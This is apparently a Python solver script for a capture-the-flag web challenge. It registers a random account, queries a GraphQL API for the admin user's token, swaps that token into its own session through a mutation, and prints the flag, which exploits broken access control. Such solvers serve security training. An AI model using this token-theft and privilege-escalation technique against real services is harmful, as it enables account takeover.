import os
import random
import json
from hashlib import sha256

import requests


url = f"http://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}"
uid = sha256(str(random.random()).encode()).hexdigest()
password = sha256(str(random.random()).encode()).hexdigest()
name = sha256(str(random.random()).encode()).hexdigest()
session = requests.Session()
admin_token = None


def register():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"uid={uid}&password={password}&name={name}"
    response = session.post(url+"/register", headers=headers, data=data)

    if response.status_code != 200:
        print("[*] Error: register()")
        exit(1)


def login():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"uid={uid}&password={password}"
    response = session.post(url+"/login", headers=headers, data=data)

    if response.status_code != 200:
        print("[*] Error: login()")
        exit(1)


def get_admin_token():
    global admin_token

    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "query": """query {
            someone(uid: "admin") {
                token
            }
        }"""
    }
    response = session.post(url+"/api", headers=headers, data=json.dumps(data)) 

    if response.status_code != 200:
        print("[*] Error: get_admin_token()")

    admin_token = response.json()["data"]["someone"]["token"]


def update_token():
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "query": """mutation {{
            updateToken(token: "{admin_token}")
        }}""".format(admin_token=admin_token)
    }
    response = session.post(url+"/api", headers=headers, data=json.dumps(data))

    if response.status_code != 200:
        print(response.text)
        print("[*] Error: update_token()")


def get_flag():
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "query": """query {
            flag
        }"""
    }
    response = session.post(url+"/api", headers=headers, data=json.dumps(data)) 

    if response.status_code != 200:
        print(response.text)
        print("[*] Error: update_token()")

    print(f"[*] FLAG: {response.json()['data']['flag']}")


def main():
    register()
    login()
    get_admin_token()
    update_token()
    get_flag()


if __name__ == '__main__':
    main()
